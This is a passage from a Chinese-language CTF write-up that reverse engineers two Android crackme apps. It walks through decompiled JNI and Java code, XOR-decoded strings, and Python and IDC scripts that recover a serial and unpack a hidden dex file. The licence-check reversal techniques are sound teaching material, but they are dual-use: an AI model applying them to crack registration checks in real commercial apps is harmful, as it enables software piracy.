Toast.makeText(RegActivity.this, \"\\u60a8\\u7684\\u8f93\\u5165\\u4e3a\\u7a7a\", 0).show(); // 您的输入为空 return; &#125; ((MyApp) RegActivity.this.getApplication()).saveSN(sn); new Builder(RegActivity.this).setTitle(\"\\u56de\\u590d\").setMessage(\"\\u60a8\\u7684\\u6ce8\\u518c\\u7801\\u5df2\\u4fdd\\u5b58\").setPositiveButton(\"\\u597d\\u5427\", new DialogInterface.OnClickListener() &#123; // Title =&gt; 回复 | Message =&gt; 您的注册码已保存 | PositiveButton =&gt; 好吧 public void onClick(DialogInterface dialog, int which) &#123; Process.killProcess(Process.myPid()); &#125; &#125;).show(); &#125; &#125;); &#125;&#125; 那么基本上就是求出正确的 SN 了。在 Native 查看，发现函数在 JNI_OnLoad 中动态注册： 1234567891011121314signed int __fastcall JNI_OnLoad(_JavaVM *a1)&#123; if ( a1-&gt;functions-&gt;GetEnv(&amp;a1-&gt;functions, (void **)&amp;g_env, 65542) ) return -1; _android_log_print(2, \"com.gdufs.xman\", \"JNI_OnLoad()\"); native_class = (int)g_env-&gt;functions-&gt;FindClass(&amp;g_env-&gt;functions, \"com/gdufs/xman/MyApp\"); if ( !g_env-&gt;functions-&gt;RegisterNatives(&amp;g_env-&gt;functions, (jclass)native_class, (const JNINativeMethod *)gMethods, 3) )// register 3 methods &#123; _android_log_print(2, \"com.gdufs.xman\", \"RegisterNatives() --&gt; nativeMethod() ok\"); return 65542; &#125; _android_log_print(6, \"com.gdufs.xman\", \"RegisterNatives() --&gt; nativeMethod() failed\"); return -1;&#125; 先来看 initSN，其中读取 /sdcard/reg.dat 中的内容并和 EoPAoY62@ElRD 进行比较： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849void __fastcall initSN(_JNIEnv *a1)&#123; _JNIEnv *env; // r6 FILE *f; // r0 FILE *f_1; // r4 _JNIEnv *env_1; // r0 int v5; // r1 int len; // r7 char *data; // r5 _JNIEnv *env_2; // r0 int v9; // r1 env = a1; f = fopen(\"/sdcard/reg.dat\", \"r+\"); f_1 = f; if ( !f ) // read file error &#123; env_1 = env; v5 = (int)f_1;LABEL_5: setValue(env_1, v5); return; &#125; fseek(f, 0, 2); // seek to file end ( SEEK_END ) len = ftell(f_1); data = (char *)malloc(len + 1); // malloc error if ( !data ) &#123; fclose(f_1); env_1 = env; v5 = 0; goto LABEL_5; &#125; fseek(f_1, 0, 0); // seek to file start ( SEEK_SET ) fread(data, len, 1u, f_1); data[len] = 0; if ( !strcmp(data, \"EoPAoY62@ElRD\") ) &#123; env_2 = env; v9 = 1; &#125; else &#123; env_2 = env; v9 = 0; &#125; setValue(env_2, v9); j_fclose(f_1);&#125; 其中看到有一个 setValue 函数，将 m 的值设为指定的值： 123456789101112131415void __fastcall setValue(_JNIEnv *a1, int val)&#123; int val_1; // r7 _JNIEnv *v3; // r4 jclass v4; // r0 void *v5; // r5 struct _jfieldID *v6; // r0 val_1 = val; v3 = a1; v4 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, \"com/gdufs/xman/MyApp\"); v5 = v4; v6 = v3-&gt;functions-&gt;GetStaticFieldID(&amp;v3-&gt;functions, v4, \"m\", \"I\"); v3-&gt;functions-&gt;SetStaticIntField(&amp;v3-&gt;functions, v5, v6, val_1);// set m = val&#125; 接下来看 saveSN，这里做一个循环，将 reg.dat 中的字符串取出来并和 key 进行异或： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778int __fastcall saveSN(_JNIEnv *a1, int a2, jstring a3)&#123; _JNIEnv *env; // r6 jstring str; // r9 FILE *v5; // r7 int *v7; // r4 const char *v8; // r3 int v9; // r0 int v10; // r1 _WORD *v11; // r5 JNIEnv *v12; // r0 int i; // r4 const struct JNINativeInterface *v14; // r3 signed int j; // r6 const char *utf_string; // r9 const char *data; // r5 signed int len; // r10 char val; // r2 char tmp; // r3 int v21; // [sp+0h] [bp-38h] int v22; // [sp+14h] [bp-24h] char v23; // [sp+18h] [bp-20h] env = a1; str = a3; f = fopen(\"/sdcard/reg.dat\", \"w+\"); if ( f ) &#123; v7 = &amp;v21; v8 = \"W3_arE_whO_we_ARE\"; do &#123; v9 = *(_DWORD *)v8; v8 += 8; v10 = *((_DWORD *)v8 - 1); *v7 = v9; v7[1] = v10; v11 = v7 + 2; v7 += 2; &#125; while ( v8 != \"E\" ); v12 = &amp;env-&gt;functions; i = 2016; *v11 = *(_WORD *)v8; v14 = env-&gt;functions; j = 0; utf_string = v14-&gt;GetStringUTFChars(v12, str, 0); data = utf_string; len = strlen(utf_string); while ( j &lt; len ) &#123; if ( j % 3 == 1 ) &#123; i = (i + 5) % 16; val = *(&amp;v23 + i - 23); // &amp;v23 - 32 = &amp;\"3_arE_whO_we_ARE\" &#125; else if ( j % 3 == 2 ) &#123; i = (i + 7) % 15; val = *(&amp;v23 + i - 22); // &amp;v23 - 22 = &amp;\"_arE_whO_we_ARE\" &#125; else &#123; i = (i + 3) % 13; val = *(&amp;v23 + i - 21); // &amp;v23 - 21 = &amp;\"arE_whO_we_ARE\" &#125; tmp = *data; ++j; *((_BYTE *)++data - 1) = tmp ^ val; &#125; fputs(utf_string, f); &#125; else if ( v22 == _stack_chk_guard ) &#123; return j___android_log_print(3, \"com.gdufs.xman\", &amp;unk_2DCA); &#125; return j_fclose(f);&#125; work 函数中初始化了 SN，获取了 m 的值，并最后调用 callWork： 123456789101112131415161718192021222324252627void __fastcall work(_JNIEnv *a1)&#123; _JNIEnv *env; // r4 jint m; // r0 _JNIEnv *env_1; // r0 void *v4; // r1 bool v5; // zf env = a1; initSN(a1); m = getValue(env); if ( m ) &#123; v5 = m == 1; env_1 = env; if ( v5 ) v4 = &amp;unk_2E6B; // [0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE5, 0x8D, 0xB3, 0xE6, 0x98, 0xAF, 0x66, 0x6C, 0x61, 0x67, 0x2C, 0xE6, 0xA0, 0xBC, 0xE5, 0xBC, 0x8F, 0xE4, 0xB8, 0xBA, 0x78, 0x6D, 0x61, 0x6E, 0x7B, 0xE2, 0x80, 0xA6, 0xE2, 0x80, 0xA6, 0x7D, 0xEF, 0xBC, 0x81] else v4 = &amp;unk_2E95; // [0xE7, 0x8A, 0xB6, 0xE6, 0x80, 0x81, 0xE4, 0xB8, 0x8D, 0xE5, 0xA4, 0xAA, 0xE5, 0xAF, 0xB9, 0xE3, 0x80, 0x82, 0xE3, 0x80, 0x82] &#125; else &#123; env_1 = env; v4 = &amp;unk_2E5B; // [0xE8, 0xBF, 0x98, 0xE4, 0xB8, 0x8D, 0xE8, 0xA1, 0x8C, 0xE5, 0x91, 0xA2, 0xEF, 0xBC, 0x81] &#125; callWork(env_1, (int)v4);&#125; 其中 getValue 就是获取 m 的值： 12345678910111213jint __fastcall getValue(_JNIEnv *a1)&#123; _JNIEnv *v1; // r4 jclass v2; // r0 void *v3; // r5 struct _jfieldID *v4; // r0 v1 = a1; v2 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, \"com/gdufs/xman/MyApp\"); v3 = v2; v4 = v1-&gt;functions-&gt;GetStaticFieldID(&amp;v1-&gt;functions, v2, \"m\", \"I\"); return v1-&gt;functions-&gt;GetStaticIntField(&amp;v1-&gt;functions, v3, v4);// get m's value&#125; callWork 中就是调用了 work 函数，这样看来是个死循环： 1234567891011121314151617181920212223242526void __fastcall callWork(_JNIEnv *a1, void *a2)&#123; const char *v2; // r8 _JNIEnv *env; // r4 jclass v4; // r0 void *v5; // r5 struct _jmethodID *v6; // r0 jobject v7; // r7 struct _jmethodID *v8; // r5 void (*v9)(JNIEnv *, jobject, jmethodID, ...); // r6 jstring v10; // r0 v2 = (const char *)a2; env = a1; v4 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, \"com/gdufs/xman/MainActivity\"); v5 = v4; v6 = env-&gt;functions-&gt;GetMethodID(&amp;env-&gt;functions, v4, \"&lt;init&gt;\", \"()V\"); v7 = env-&gt;functions-&gt;NewObject(&amp;env-&gt;functions, v5, v6); v8 = env-&gt;functions-&gt;GetMethodID(&amp;env-&gt;functions, v5, \"work\", \"(Ljava/lang/String;)V\"); if ( v8 ) &#123; v9 = env-&gt;functions-&gt;CallVoidMethod; v10 = env-&gt;functions-&gt;NewStringUTF(&amp;env-&gt;functions, v2); v9(&amp;env-&gt;functions, v7, v8, v10); &#125;&#125; 在 saveSN 中其实就是实际的算法，逆一下实现解 SN 脚本： 1234567891011121314151617181920#!/usr/bin/env pythonciphertext = 'EoPAoY62@ElRD'key = 'W3_arE_whO_we_ARE'i = 2016j = 0l = len(ciphertext)result = ''while j &lt; l: if j % 3 == 1: i = (i + 5) % 16 val = ord(key[i + 1]) elif j % 3 ==2: i = (i + 7) % 15 val = ord(key[i + 2]) else: i = (i + 3) % 13 val = ord(key[i + 3]) result += chr(ord(ciphertext[j]) ^ val) j += 1print result easy-dex首先查看 AndroidManifest.xml，发现启动 Activity 为 android.app.NativeActivity，是在 Native 层实现的安卓 Activity： 12345678910111213141516171819&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;manifest android:versionCode=\"1\" android:versionName=\"1.0\" package=\"com.a.sample.findmydex\" platformBuildVersionCode=\"24\" platformBuildVersionName=\"7.0\" xmlns:android=\"http://schemas.android.com/apk/res/android\"&gt; &lt;uses-sdk android:minSdkVersion=\"19\" android:targetSdkVersion=\"24\" /&gt; &lt;application android:allowBackup=\"false\" android:fullBackupContent=\"false\" android:hasCode=\"false\" android:icon=\"@mipmap/ic_launcher\" android:label=\"@string/app_name\" android:theme=\"@style/AppTheme\"&gt; &lt;activity android:configChanges=\"0xa0\" android:label=\"@string/app_name\" android:name=\"android.app.NativeActivity\"&gt; &lt;meta-data android:name=\"android.app.lib_name\" android:value=\"native\" /&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.intent.action.MAIN\" /&gt; &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;activity android:name=\"com.a.sample.findmydex.MainActivity\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"com.a.sample.findmydex.MAIN\" /&gt; &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;/application&gt;&lt;/manifest&gt; 看了一下 Java 只有一个类： 12345class Placeholder &#123; Placeholder() &#123; super(); &#125;&#125; 先查看 NativeActivity 中的 onCreate 函数，其中在 pthread_create 里的第三个参数是对应的 MainActivity 的入口点，即 android_app_entry： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364int __fastcall ANativeActivity_onCreate(_DWORD *a1, int a2, size_t a3)&#123; _DWORD *v3; // r8 int savedState; // r10 size_t savedStateSize; // r9 int activity; // r0 __int64 v7; // r2 char *v8; // r5 void *v9; // r0 int *v10; // r0 char *v11; // r0 pthread_attr_t attr; // [sp+4h] [bp-30h] v3 = a1; savedState = a2; savedStateSize = a3; activity = *a1; *(_DWORD *)(activity + 20) = sub_3000; *(_DWORD *)activity = sub_305A; *(_DWORD *)(activity + 4) = sub_3062; *(_DWORD *)(activity + 8) = sub_306A; *(_DWORD *)(activity + 12) = sub_30BE; HIDWORD(v7) = sub_30EE; *(_DWORD *)(activity + 16) = sub_30C6; LODWORD(v7) = sub_30DE; *(_DWORD *)(activity + 56) = sub_30CE; *(_DWORD *)(activity + 60) = sub_30D6; *(_QWORD *)(activity + 24) = v7; *(_DWORD *)(activity + 40) = sub_30F4; *(_DWORD *)(activity + 44) = sub_30FC; *(_DWORD *)(activity + 48) = sub_3102; v8 = (char *)malloc(0x94u); _aeabi_memclr4(); *((_DWORD *)v8 + 3) = v3; pthread_mutex_init((pthread_mutex_t *)(v8 + 64), 0); pthread_cond_init((pthread_cond_t *)(v8 + 68), 0); if ( savedState ) &#123; v9 = malloc(savedStateSize); *((_DWORD *)v8 + 5) = v9; *((_DWORD *)v8 + 6) = savedStateSize; _aeabi_memcpy(v9, savedState, savedStateSize); &#125; if ( pipe(&amp;attr.__align + 6) ) &#123; v10 = (int *)_errno(); v11 = strerror(*v10); _android_log_print(6, \"threaded_app\", \"could not create pipe: %s\", v11); v8 = 0; &#125; else &#123; *((_QWORD *)v8 + 9) = *((_QWORD *)&amp;attr.__align + 3); pthread_attr_init(&amp;attr); pthread_attr_setdetachstate(&amp;attr, 1); pthread_create((pthread_t *)v8 + 20, &amp;attr, (void *(*)(void *))android_app_entry, v8); pthread_mutex_lock((pthread_mutex_t *)(v8 + 64)); while ( !*((_DWORD *)v8 + 27) ) pthread_cond_wait((pthread_cond_t *)(v8 + 68), (pthread_mutex_t *)(v8 + 64)); pthread_mutex_unlock((pthread_mutex_t *)(v8 + 64)); &#125; v3[7] = v8; return _stack_chk_guard - *(&amp;attr.__align + 8);&#125; 在 android_app_entry 中，在 android_app_destroy 上面可以找到对应的 MainActivity 函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243int __fastcall android_app_entry(int a1)&#123; int v1; // r4 int v2; // r1 int v3; // r5 int result; // r0 char v5; // [sp+8h] [bp-14h] char v6; // [sp+Ah] [bp-12h] int v7; // [sp+Ch] [bp-10h] v1 = a1; *(_DWORD *)(a1 + 16) = AConfiguration_new(); v2 = *(_DWORD *)(*(_DWORD *)(v1 + 12) + 32); AConfiguration_fromAssetManager(); AConfiguration_getLanguage(*(_DWORD *)(v1 + 16), &amp;v6); AConfiguration_getCountry(*(_DWORD *)(v1 + 16), &amp;v5); *(_DWORD *)(v1 + 84) = 1; *(_DWORD *)(v1 + 88) = v1; *(_DWORD *)(v1 + 92) = sub_3344; *(_DWORD *)(v1 + 96) = 2; *(_DWORD *)(v1 + 100) = v1; *(_DWORD *)(v1 + 104) = sub_3370; v3 = ALooper_prepare(1); ALooper_addFd(v3, *(_DWORD *)(v1 + 72), 1, 1, 0, v1 + 84); *(_DWORD *)(v1 + 28) = v3; pthread_mutex_lock((pthread_mutex_t *)(v1 + 64)); *(_DWORD *)(v1 + 108) = 1; pthread_cond_broadcast((pthread_cond_t *)(v1 + 68)); pthread_mutex_unlock((pthread_mutex_t *)(v1 + 64)); j_android_main(v1); android_app_destroy(v1); pthread_mutex_lock((pthread_mutex_t *)(v1 + 64)); if ( *(_DWORD *)(v1 + 32) ) AInputQueue_detachLooper(); AConfiguration_delete(*(_DWORD *)(v1 + 16)); *(_DWORD *)(v1 + 116) = 1; pthread_cond_broadcast((pthread_cond_t *)(v1 + 68)); pthread_mutex_unlock((pthread_mutex_t *)(v1 + 64)); result = _stack_chk_guard - v7; if ( _stack_chk_guard == v7 ) result = 0; return result;&#125; 进入 MainActivity 之后，一开始有一段异或的数据： 12345678910111213141516171819202122232425262728293031323334353637383940414243*(_DWORD *)filename = 0x9D888DC6;*(_DWORD *)&amp;filename[4] = 0x888DC688;*(_DWORD *)&amp;filename[8] = 0x8AC6889D;*(_DWORD *)&amp;filename[12] = 0x88C78486;*(_DWORD *)&amp;filename[16] = 0x84889AC7;*(_DWORD *)&amp;filename[20] = 0xC78C8599;*(_DWORD *)&amp;filename[24] = 0x8D87808F;*(_DWORD *)&amp;filename[28] = 0x8C8D9084;*(_DWORD *)&amp;filename[32] = 0x808FC691;*(_DWORD *)&amp;filename[36] = 0xC69A8C85;*(_DWORD *)&amp;filename[40] = 0x9A88858A;*(_DWORD *)&amp;filename[44] = 0xC79A8C9A;*(_DWORD *)&amp;filename[48] = 0xE9918C8D;filename[52] = 0;*(_DWORD *)name = 0x9D888DC6;*(_DWORD *)&amp;name[4] = 0x888DC688;*(_DWORD *)&amp;name[8] = 0x8AC6889D;*(_DWORD *)&amp;name[12] = 0x88C78486;*(_DWORD *)&amp;name[16] = 0x84889AC7;*(_DWORD *)&amp;name[20] = 0xC78C8599;*(_DWORD *)&amp;name[24] = 0x8D87808F;*(_DWORD *)&amp;name[28] = 0x8C8D9084;*(_DWORD *)&amp;name[32] = 0x808FC691;*(_DWORD *)&amp;name[36] = 0xC69A8C85;*(_DWORD *)&amp;name[40] = 0x918C8D86;name[46] = 0;i = 1;*(_WORD *)&amp;name[44] = 0xE9C6u;filename[0] = 47;do&#123; filename[i] ^= 0xE9u; // filename = '/data/data/com.a.sample.findmydex/files/classes.dex' ++i;&#125;while ( i != 53 );j = 1;name[0] = 47;do&#123; name[j] ^= 0xE9u; // name = '/data/data/com.a.sample.findmydex/files/odex/' ++j;&#125;while ( j != 47 ); 解密一下，可以发现是生成目标 dex 文件和 odex 的路径： 123456789101112131415161718192021222324252627282930313233#!/usr/bin/env pythondef word2bytes(w): return [w &amp; 0xFF, (w &gt;&gt; 8) &amp; 0xFF, (w &gt;&gt; 16) &amp; 0xFF, w &gt;&gt; 24]def bytes2word(bs): return bs[0] | bs[1] &lt;&lt; 8 | bs[2] &lt;&lt; 16 | bs[3] &lt;&lt; 24def words2byte(ws): result = [] for w in ws: temp = word2bytes(w) for b in temp: result.append(b) return resultdef bytes2words(bs): result = [] for i in range(len(bs) / 4): temp = bytes2word(bs[4*i:4*i+4]) result.append(temp) return resultfilename = [0x9D888DC6, 0x888DC688, 0x8AC6889D, 0x88C78486, 0x84889AC7, 0xC78C8599, 0x8D87808F, 0x8C8D9084, 0x808FC691, 0xC69A8C85, 0x9A88858A, 0xC79A8C9A, 0xE9918C8D]name = [0x9D888DC6, 0x888DC688, 0x8AC6889D, 0x88C78486, 0x84889AC7, 0xC78C8599, 0x8D87808F, 0x8C8D9084, 0x808FC691, 0xC69A8C85, 0x918C8D86, 0x0000E9C6]filename = words2byte(filename)name = words2byte(name)filename = chr(47) + ''.join(list(map(lambda c: chr(c ^ 0xE9), filename[1:])))name = chr(47) + ''.join(list(map(lambda c: chr(c ^ 0xE9), name[1:])))print filename# /data/data/com.a.sample.findmydex/files/classes.dexprint name# /data/data/com.a.sample.findmydex/files/odex/ 然后接下来，可以看到一些涉及到 OpenGL 库的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142... _android_log_print(4, \"FindMyDex\", \"Can you shake your phone 100 times in 10 seconds?\"); v10 = 0; do &#123; while ( 1 ) &#123; v12 = 0; if ( !v30 ) v12 = -1; v13 = ALooper_pollAll(v12, 0, &amp;v25, &amp;v24);// get time if ( v13 &gt;= 0 ) break; if ( v30 ) &#123; v11 = v31 + 0.01; if ( (float)(v31 + 0.01) &gt; 1.0 ) v11 = 0.0; v31 = v11; sub_2C14((int)&amp;v26); // OpenGL &#125; &#125;...int __fastcall sub_2C14(int a1)&#123; int v1; // r4 int result; // r0 v1 = a1; result = *(_DWORD *)(a1 + 20); if ( !result ) return result; glClearColor( (float)*(signed int *)(v1 + 44) / (float)*(signed int *)(v1 + 32),// red *(GLclampf *)(v1 + 40), // green (float)*(signed int *)(v1 + 48) / (float)*(signed int *)(v1 + 36),// blue 1.0); glClear(0x4000u); result = j_eglSwapBuffers(*(_QWORD *)(v1 + 20), *(_QWORD *)(v1 + 20) &gt;&gt; 32); return result;&#125; 这部分不去仔细看，可以直接根据 log 来判断程序的流程，可以判断出是要求在 10 秒内摇 100 次手机。在 (times - 1) &lt;= 88 处可以看到开始对数据进行解压缩处理。在后面 times == 100，可以判断是达到了 100 次后，开始对将数据输出到文件中： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465... _android_log_print(4, \"FindMyDex\", \"Can you shake your phone 100 times in 10 seconds?\");... _android_log_print(4, \"FindMyDex\", \"Oh yeah~ You Got it~ %d times to go~\", 99 - v10);... if ( (unsigned int)(times - 1) &lt;= 88 ) &#123; v10 = times; v15 = times / 10; if ( times % 10 == 9 ) &#123; v16 = size_1; v17 = (signed int)size_1 / 10; v18 = (v15 + 1) * ((signed int)size_1 / 10); if ( (signed int)size_1 / 10 * v15 &lt; v18 ) &#123; v19 = &amp;data[v17 * v15]; do &#123; --v17; *v19++ ^= times; &#125; while ( v17 ); &#125; if ( times == 89 ) &#123; while ( v18 &lt; (signed int)v16 ) data[v18++] ^= 0x59u; &#125; v10 = times + 1; &#125; &#125; if ( times == 100 ) // reach the target &#123; if ( (signed int)(time(0) - v6) &gt; 9 ) &#123; _android_log_print(4, \"FindMyDex\", \"OH~ You are too slow. Please try again\"); _aeabi_memcpy(data, &amp;data_1, size_1); v10 = 0; &#125; else &#123; v20 = v6; if ( uncompress(dest, &amp;destLen, data, (uLong)size_1) )// uncompress data _android_log_print(5, \"FindMyDex\", \"Dangerous operation detected.\"); v21 = open(filename, 577, 511); if ( !v21 ) _android_log_print(5, \"FindMyDex\", \"Something wrong with the permission.\"); write(v21, dest, destLen); close(v21); free(dest); free(data); if ( access(name, 0) &amp;&amp; mkdir(name, 0x1FFu) ) _android_log_print(5, \"FindMyDex\", \"Something wrong with the permission..\"); sub_2368((int)v1); remove(filename); _android_log_print(4, \"FindMyDex\", \"Congratulations!! You made it!\"); sub_2250(v1); v10 = 0x80000000; v6 = v20; &#125; &#125; &#125; &#125;... 用 IDC 脚本把数据 dump 下来： 12345678910static main() &#123; auto fp, start, end, len, b; fp = fopen(\"dump.data\", \"wb\"); start = 0x7004; len = 0x3CA10; end = start + len; for (b = start; b &lt; end; b++) &#123; fputc(Byte(b), fp); &#125;&#125; 然后实现一下对 dex 文件的解压缩过程： 12345678910111213141516171819202122232425#!/usr/bin/env pythonimport zlibwith open('dump.data', 'rb') as f: data = f.read()data = [ord(c) for c in data]size = 0x3CA10for times in range(90): v15 = times / 10 if times % 10 == 9: v16 = size v17 = size / 10 v18 = (v15 + 1) * (size / 10) if size / 10 * v15 &lt; v18: for i in range(v17): data[v17 * v15 + i] ^= times if times == 89: while v18 - v16 &lt; 0: data[v18] ^= 0x59 v18 += 1data = ''.join([chr(c) for c in data])data = zlib.decompress(data)with open('dump.dex', 'wb') as f: for c in data: f.write(c) 接下来用 JEB 对 dex 文件进行分析。首先在 MainActivity 中，变量 m 是密文，onCreate 中调用了 a 类。函数 b 则是一个加密函数，其中涉及到了 b 类中函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364package com.a.sample.findmydex;import android.content.Context;import android.os.Bundle;import android.support.v7.a.u;import java.io.BufferedInputStream;import java.io.ByteArrayInputStream;import java.nio.ByteBuffer;import java.util.ArrayList;public class MainActivity extends u &#123; private static byte[] m; static &#123; MainActivity.m = new byte[]&#123;-120, 77, -14, -38, 17, 5, -42, 44, -32, 109, 85, 0x1F, 24, -91, -112, -83, 0x40, -83, -128, 84, 5, -94, -98, -30, 18, 70, -26, 71, 5, -99, -62, -58, 0x75, 29, -44, 6, 0x70, -4, 81, 84, 9, 22, -51, 0x5F, -34, 12, 0x2F, 77&#125;; &#125; public MainActivity() &#123; super(); &#125; static byte[] a(String arg1, String arg2) &#123; return MainActivity.b(arg1, arg2); &#125; private static byte[] b(String arg7, String arg8) &#123; byte[] v0_1; try &#123; BufferedInputStream v2 = new BufferedInputStream(new ByteArrayInputStream(arg7.getBytes())); byte[] v1 = new byte[16]; ArrayList v3 = new ArrayList(); Object v4 = b.a(arg8.getBytes()); // 处理密钥 while(v2.read(v1, 0, 16) != -1) &#123; // 循环加密，采用ECB模式 v3.add(b.a(v1, 0, v4)); v1 = new byte[16]; &#125; ByteBuffer v2_1 = ByteBuffer.allocate(v3.size() * 16); // 转换成字节数组 Object[] v3_1 = v3.toArray(); int v4_1 = v3_1.length; int v1_1; for(v1_1 = 0; v1_1 &lt; v4_1; ++v1_1) &#123; v2_1.put(v3_1[v1_1]); &#125; v0_1 = v2_1.array(); &#125; catch(Exception v0) &#123; v0_1 = new byte[1]; &#125; return v0_1; &#125; static byte[] i() &#123; // Cipheretxt return MainActivity.m; &#125; protected void onCreate(Bundle arg4) &#123; super.onCreate(arg4); this.setContentView(0x7F04001A); // activity_main this.findViewById(0x7F0B0055).setOnClickListener(new a(this, this.findViewById(0x7F0B0054), ((Context)this))); // button | edit_text &#125;&#125; 类 a 中设置了一个监听按钮的事件，并将输入和指定的字符串作为参数传入 MainActivity 的函数 a。并与密文进行比较： 1234567891011121314151617181920212223242526package com.a.sample.findmydex;import android.content.Context;import android.view.View$OnClickListener;import android.view.View;import android.widget.EditText;import android.widget.Toast;import java.util.Arrays;class a implements View$OnClickListener &#123; a(MainActivity arg1, EditText arg2, Context arg3) &#123; this.c = arg1; this.a = arg2; this.b = arg3; super(); &#125; public void onClick(View arg5) &#123; if(Arrays.equals(MainActivity.a(this.a.getText().toString(), this.c.getString(0x7F060023)), MainActivity.i())) &#123; // I have a male fish and a female fish. Toast.makeText(this.b, this.c.getString(0x7F060025), 1).show(); // Yes! You got me! :) &#125; else &#123; Toast.makeText(this.b, this.c.getString(0x7F060022), 1).show(); // NO~ You don't get me~ T_T &#125; &#125;&#125; b 类的 a 函数主要将数组的长度补齐成 8 的倍数，并调用 b 函数： 12345678910111213141516171819202122232425262728293031public static Object a(byte[] arg5) &#123; // 补齐块 Object v0_3; int v1 = 0x20; int v0 = 0; Class v2 = b.class; __monitor_enter(v2); try &#123; if(arg5.length &gt; v1 || arg5.length % 8 != 0) &#123; // 长度大于32或不是8的倍数 if(arg5.length &lt;= v1) &#123; v1 = arg5.length; &#125; if((v1 &amp; 7) &gt; 0) &#123; // 判断数组长度是否是8的倍数，不是的话补齐 v0 = 1; &#125; byte[] v0_2 = new byte[v0 * 8 + v1]; System.arraycopy(arg5, 0, v0_2, 0, v1); arg5 = v0_2; &#125; v0_3 = b.b(arg5); &#125; catch(Throwable v0_1) &#123; __monitor_exit(v2); throw v0_1; &#125; __monitor_exit(v2); return v0_3;&#125; b 类中的 b 函数是一个处理密钥的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163private static Object b(byte[] arg19) &#123; // 处理密钥 Object[] v1_2; int[] v13; int v10_1; int v9_1; int v8_1; int[] v11_1; int v12; int v3; int v1_1; int v5; int v4; Class v6 = b.class; __monitor_enter(v6); if(arg19 != null) &#123; goto label_10; &#125; try &#123; throw new InvalidKeyException(\"Empty key\"); label_10: v4 = arg19.length; if(v4 != 8 &amp;&amp; v4 != 16 &amp;&amp; v4 != 24 &amp;&amp; v4 != 0x20) &#123; throw new InvalidKeyException(\"Incorrect key length\"); &#125; int v7 = v4 / 8; v5 = 40; int[] v8 = new int[4]; int[] v9 = new int[4]; int[] v10 = new int[4]; v1_1 = 0; v3 = 0; int v2; for(v2 = v7 - 1; v3 &lt; 4; --v2) &#123; if(v1_1 &gt;= v4) &#123; break; &#125; int v11 = v1_1 + 1; v12 = v11 + 1; v1_1 = arg19[v1_1] &amp; 0xFF | (arg19[v11] &amp; 0xFF) &lt;&lt; 8; v11 = v12 + 1; v1_1 |= (arg19[v12] &amp; 0xFF) &lt;&lt; 16; v12 = v11 + 1; v8[v3] = v1_1 | (arg19[v11] &amp; 0xFF) &lt;&lt; 24; v1_1 = v12 + 1; v11 = arg19[v12] &amp; 0xFF; v12 = v1_1 + 1; v1_1 = (arg19[v1_1] &amp; 0xFF) &lt;&lt; 8 | v11; v11 = v12 + 1; v12 = (arg19[v12] &amp; 0xFF) &lt;&lt; 16 | v1_1; v1_1 = v11 + 1; v9[v3] = (arg19[v11] &amp; 0xFF) &lt;&lt; 24 | v12; v10[v2] = b.a(v8[v3], v9[v3]); ++v3; &#125; v11_1 = new int[v5]; v1_1 = 0; v2 = 0; while(v2 &lt; 20) &#123; v3 = b.a(v7, v1_1, v8); v4 = b.a(v7, 0x1010101 + v1_1, v9); v4 = v4 &gt;&gt;&gt; 24 | v4 &lt;&lt; 8; v3 += v4; v11_1[v2 * 2] = v3; v3 += v4; v11_1[v2 * 2 + 1] = v3 &gt;&gt;&gt; 23 | v3 &lt;&lt; 9; ++v2; v1_1 += 0x2020202; &#125; v8_1 = v10[0]; v9_1 = v10[1]; v12 = v10[2]; v10_1 = v10[3]; v13 = new int[0x400]; v2 = 0; while(true) &#123; label_120: if(v2 &gt;= 0x100) &#123; goto label_324; &#125; switch(v7 &amp; 3) &#123; case 0: &#123; goto label_183; &#125; case 1: &#123; goto label_126; &#125; case 2: &#123; goto label_332; &#125; case 3: &#123; goto label_337; &#125; &#125; goto label_124; &#125; &#125; catch(Throwable v1) &#123; goto label_8; &#125;label_337: v1_1 = v2; v3 = v2; v4 = v2; v5 = v2; goto label_211; try &#123; label_183: v5 = b.a[1][v2] &amp; 0xFF ^ b.e(v10_1); v4 = b.a[0][v2] &amp; 0xFF ^ b.f(v10_1); v3 = b.g(v10_1) ^ b.a[0][v2] &amp; 0xFF; v1_1 = b.a[1][v2] &amp; 0xFF ^ b.h(v10_1); label_211: v5 = b.a[1][v5] &amp; 0xFF ^ b.e(v12); v4 = b.a[1][v4] &amp; 0xFF ^ b.f(v12); v3 = b.a[0][v3] &amp; 0xFF ^ b.g(v12); v1_1 = b.a[0][v1_1] &amp; 0xFF ^ b.h(v12); goto label_239; &#125; catch(Throwable v1) &#123; goto label_8; &#125;label_332: v1_1 = v2; v3 = v2; v4 = v2; v5 = v2; try &#123; label_239: v13[v2 * 2] = b.b[0][b.a[0][b.a[0][v5] &amp; 0xFF ^ b.e(v9_1)] &amp; 0xFF ^ b.e(v8_1)]; v13[v2 * 2 + 1] = b.b[1][b.a[0][b.a[1][v4] &amp; 0xFF ^ b.f(v9_1)] &amp; 0xFF ^ b.f(v8_1)]; v13[v2 * 2 + 0x200] = b.b[2][b.a[1][b.a[0][v3] &amp; 0xFF ^ b.g(v9_1)] &amp; 0xFF ^ b.g(v8_1)]; v13[v2 * 2 + 0x201] = b.b[3][b.a[1][b.a[1][v1_1] &amp; 0xFF ^ 